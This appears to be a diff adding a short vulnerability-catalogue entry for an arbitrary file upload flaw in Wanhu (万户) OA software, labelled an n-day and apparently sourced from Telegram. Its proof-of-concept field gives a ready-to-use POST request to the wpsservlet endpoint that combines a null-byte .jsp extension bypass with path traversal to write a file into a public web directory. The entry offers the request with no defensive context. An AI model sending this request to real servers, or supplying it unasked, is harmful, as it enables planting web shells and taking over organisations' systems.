@@ -1,0 +1,7 @@
+vendor = "万户"
+name = "万户任意文件上传"
+type = "任意文件上传"
+source = "TG"
+date = "08.15"
+poc = "POST /defaultroot/wpsservlet?fileType=.jsp%00&option=SaveNewFile&unewdacid=..%2F..%2Fpublic%2Fedit%2Fxman3"
+label = "nday"
